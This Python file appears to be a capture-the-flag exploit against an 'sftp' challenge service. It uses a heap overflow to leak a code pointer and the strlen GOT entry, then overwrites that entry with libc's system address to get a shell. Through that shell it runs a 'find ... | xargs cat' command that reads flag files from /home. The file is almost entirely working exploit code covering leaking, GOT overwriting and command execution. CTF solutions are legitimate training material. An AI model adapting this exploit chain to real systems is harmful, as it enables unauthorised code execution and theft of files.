#!/usr/bin/env python3

import pwn3r
from pwn3r import *
import socket
import sys
import time

FILE_ENTRY = 2
home = '/home/c01db33f/'
delay = 0
libc_strlen_offset = 0x8b720
libc_system_offset = 0x45390

def sleep_until(end):
    begin = (time.time())
    time.sleep(end-begin-delay)

def menu(tube, command):
    tube.recvuntil('sftp> ')
    tube.sendline(command)

def put_file(tube, length, filename, content):
    menu(tube, 'put {}'.format(filename))
    tube.sendint(length)
    tube.send(content)

def mkdir(tube, dirname):
    menu(tube, 'mkdir {}'.format(dirname))

def show_help(tube):
    menu(tube, 'help')

def get_file(tube, filename):
    menu(tube, 'get {}'.format(filename))
    tube.sendline(filename)

def login(tube):
    tube.recvuntil('(yes/no)? ')
    tube.sendline('yes')
    tube.recvuntil('password: ')
    tube.sendline('!"$(1"$hpthpxp}')

def create_tube(target):
    if target == 'remote':
        hostname = 'sftp.ctfcompetition.com'
        ip = socket.gethostbyname(hostname)
        port = 1337
        tube = pwn3r.Remote(ip, port)
        delay = 0.5
        #libc_strlen_offset =
        #libc_system_offset =
    elif target == 'run':
        tube = pwn3r.Process('./sftp')
        delay = 0
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)
        port = 12345
        tube = pwn3r.Remote(ip, port)
        delay = 0.5
    return tube

def leak(tube, victim, writer):
    get_file(tube, str(victim))
    tube.recvuntil(str(8)+'\n')
    return u64(tube.recv(8))

def overwrite(tube, victim, writer, diff, addr):
    size = 8
    victim_name = str(victim).encode('ascii').ljust(20, b'\x00')
    put_file(tube, diff+0x30, writer, b'A'*(diff) + p64(addr) + p32(FILE_ENTRY) + victim_name + p64(size) + pwn3r.p64(addr))


def attack(tube, argl):
    victim = int(argl[0])
    writer = int(argl[1])
    diff   = int(argl[2], 16)
    first  = int(argl[3], 16)

    text_leak_offset = 0x000000208be0
    got_strlen_offset = 0x205038
    login(tube)

    dummy = 'dummy'
    if victim < writer:
        for i in range(victim-1):
            mkdir(tube, str(i+1))
        put_file(tube, len(dummy), str(victim), dummy)
        for i in range(victim+1, writer-2):
            mkdir(tube, str(i+1))
        put_file(tube, diff+0x30, str(writer), b'A'*(diff+0x30))
    else:
        for i in range(writer-2):
            mkdir(tube, str(i+1))
        put_file(tube, diff+0x30, str(writer), b'A'*(diff+0x30))
        for i in range(writer, victim-1):
            mkdir(tube, str(i+1))
        put_file(tube, len(dummy), str(victim), dummy)

    overwrite(tube, victim, writer, diff, first)
    text_addr = leak(tube, victim, writer)
    text_base = text_addr - text_leak_offset
    print('')
    print(hex(text_base))
    overwrite(tube, victim, writer, diff, text_base+got_strlen_offset)
    strlen_addr = leak(tube, victim, writer)
    print('')
    print(hex(strlen_addr))
    libc_base = strlen_addr - libc_strlen_offset
    system_addr = libc_base + libc_system_offset
    put_file(tube, 8, str(victim), p64(system_addr))
    mkdir(tube, 'sh')
    tube.sendline('find /home -type f | grep flag | xargs cat')
    #show_help(tube)
    #print(argl)
    tube.recvline()

def main(target, argl):
    wake = int(argl[4])
    sleep_until(wake)
    tube = create_tube(target)
    attack(tube, argl)

if __name__ == '__main__':
    if 2 <= len(sys.argv) and sys.argv[1] == '--remote':
        target = 'remote'
    elif 2 <= len(sys.argv) and sys.argv[1] == '--run':
        target = 'run'
    elif 2 <= len(sys.argv) and sys.argv[1] == '--debug':
        target = 'debug'
    else:
        print('Specify Mode')
        sys.exit(1)
    main(target, sys.argv[2:])
